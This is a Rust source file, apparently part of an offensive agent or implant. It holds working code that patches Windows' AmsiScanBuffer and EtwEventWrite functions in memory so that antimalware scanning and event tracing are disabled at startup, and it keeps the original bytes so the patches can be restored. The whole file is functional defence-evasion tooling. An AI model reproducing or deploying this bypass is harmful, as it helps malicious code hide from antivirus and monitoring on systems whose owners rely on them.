//! Runtime memory patches — AMSI and ETW bypass.
//!
//! Patches are applied once at agent startup and can be restored via
//! `PatchManager::restore_all()`.  All Win32 calls are behind
//! `#[cfg(target_os = "windows")]`; non-Windows builds get a no-op stub.

// ─── Windows implementation ──────────────────────────────────────────────────

#[cfg(target_os = "windows")]
mod win {
    use anyhow::{bail, Result};
    use std::ffi::CString;
    use windows_sys::Win32::System::LibraryLoader::{
        GetModuleHandleA, GetProcAddress, LoadLibraryA,
    };
    use windows_sys::Win32::System::Memory::{VirtualProtect, PAGE_EXECUTE_READWRITE};

    /// A single in-memory patch that can be reverted.
    pub struct AppliedPatch {
        address: *mut u8,
        original_bytes: Vec<u8>,
        size: usize,
    }

    // SAFETY: The pointers are only used within the process that created them
    // and are valid for the lifetime of the loaded modules.
    unsafe impl Send for AppliedPatch {}
    unsafe impl Sync for AppliedPatch {}

    impl AppliedPatch {
        /// Restore the original bytes and protection flags.
        pub fn restore(&self) -> Result<()> {
            let mut old_protect: u32 = 0;
            let ok = unsafe {
                VirtualProtect(
                    self.address as *const _,
                    self.size,
                    PAGE_EXECUTE_READWRITE,
                    &mut old_protect,
                )
            };
            if ok == 0 {
                bail!("VirtualProtect (restore rw) failed");
            }
            unsafe {
                std::ptr::copy_nonoverlapping(
                    self.original_bytes.as_ptr(),
                    self.address,
                    self.size,
                );
            }
            unsafe {
                VirtualProtect(
                    self.address as *const _,
                    self.size,
                    old_protect,
                    &mut old_protect,
                );
            }
            Ok(())
        }
    }

    /// Manages a collection of runtime memory patches.
    pub struct PatchManager {
        patches: Vec<AppliedPatch>,
    }

    impl PatchManager {
        pub fn new() -> Self {
            Self { patches: Vec::new() }
        }

        /// Patch `AmsiScanBuffer` to immediately return `E_INVALIDARG`.
        ///
        /// ```asm
        /// mov eax, 0x80070057   ; E_INVALIDARG
        /// ret
        /// ```
        pub fn patch_amsi(&mut self) -> Result<()> {
            let dll_name = CString::new("amsi.dll").unwrap();
            let fn_name = CString::new("AmsiScanBuffer").unwrap();

            let module = unsafe { LoadLibraryA(dll_name.as_ptr() as *const u8) };
            if module.is_null() {
                bail!("LoadLibraryA(amsi.dll) failed");
            }
            let addr = unsafe { GetProcAddress(module, fn_name.as_ptr() as *const u8) };
            let addr = match addr {
                Some(f) => f as *mut u8,
                None => bail!("GetProcAddress(AmsiScanBuffer) failed"),
            };

            // x86_64: mov eax, 0x80070057; ret
            let patch_bytes: &[u8] = &[0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3];
            self.apply_patch(addr, patch_bytes)?;
            Ok(())
        }

        /// Patch `EtwEventWrite` to immediately return (ret).
        pub fn patch_etw(&mut self) -> Result<()> {
            let dll_name = CString::new("ntdll.dll").unwrap();
            let fn_name = CString::new("EtwEventWrite").unwrap();

            let module = unsafe { GetModuleHandleA(dll_name.as_ptr() as *const u8) };
            if module.is_null() {
                bail!("GetModuleHandleA(ntdll.dll) failed");
            }
            let addr = unsafe { GetProcAddress(module, fn_name.as_ptr() as *const u8) };
            let addr = match addr {
                Some(f) => f as *mut u8,
                None => bail!("GetProcAddress(EtwEventWrite) failed"),
            };

            // ret
            let patch_bytes: &[u8] = &[0xC3];
            self.apply_patch(addr, patch_bytes)?;
            Ok(())
        }

        /// Restore all applied patches to their original bytes.
        pub fn restore_all(&mut self) -> Result<()> {
            for patch in self.patches.drain(..).rev() {
                patch.restore()?;
            }
            Ok(())
        }

        /// Write `patch_bytes` over `addr`, saving the original bytes.
        fn apply_patch(&mut self, addr: *mut u8, patch_bytes: &[u8]) -> Result<()> {
            let size = patch_bytes.len();

            // Save original bytes.
            let mut original = vec![0u8; size];
            unsafe {
                std::ptr::copy_nonoverlapping(addr, original.as_mut_ptr(), size);
            }

            // Make writable.
            let mut old_protect: u32 = 0;
            let ok = unsafe {
                VirtualProtect(
                    addr as *const _,
                    size,
                    PAGE_EXECUTE_READWRITE,
                    &mut old_protect,
                )
            };
            if ok == 0 {
                bail!("VirtualProtect (rw) failed");
            }

            // Write patch.
            unsafe {
                std::ptr::copy_nonoverlapping(patch_bytes.as_ptr(), addr, size);
            }

            // Restore original protection.
            let mut tmp: u32 = 0;
            unsafe {
                VirtualProtect(addr as *const _, size, old_protect, &mut tmp);
            }

            self.patches.push(AppliedPatch {
                address: addr,
                original_bytes: original,
                size,
            });
            Ok(())
        }
    }
}

// ─── Non-Windows stub ────────────────────────────────────────────────────────

#[cfg(not(target_os = "windows"))]
mod stub {
    use anyhow::Result;

    #[allow(dead_code)]
    pub struct PatchManager;

    #[allow(dead_code)]
    impl PatchManager {
        pub fn new() -> Self { Self }
        pub fn patch_amsi(&mut self) -> Result<()> { Ok(()) }
        pub fn patch_etw(&mut self) -> Result<()> { Ok(()) }
        pub fn restore_all(&mut self) -> Result<()> { Ok(()) }
    }
}

// ─── Re-export ───────────────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
pub use win::PatchManager;

#[cfg(not(target_os = "windows"))]
pub use stub::PatchManager;
